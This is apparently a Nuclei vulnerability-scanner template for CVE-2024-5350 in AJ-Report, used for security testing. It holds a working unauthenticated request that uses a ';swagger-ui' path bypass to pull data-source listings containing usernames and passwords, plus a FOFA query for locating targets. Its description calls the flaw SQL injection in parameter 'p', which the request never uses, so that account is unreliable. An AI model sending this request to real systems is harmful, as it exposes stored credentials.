id: CVE-2024-5350

info:
  name: AJ-Report pageList sql注入漏洞
  author: fgz
  severity: critical
  description: AJ-Report up to 1.4.1的漏洞已被发现，被分类为关键。受影响的是/pageList文件中的pageList函数。对参数p的操纵会导致sql注入。攻击可以远程发起。漏洞已被披露给公众，并可能被利用。
  metadata:
    max-request: 1
    fofa-query: title="AJ-Report"
    verified: true

requests:
  - raw:
      - |+
        GET /;swagger-ui/dataSource/pageList?showMoreSearch=false&pageNumber=1&pageSize=10 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'username') && contains(body, 'password')"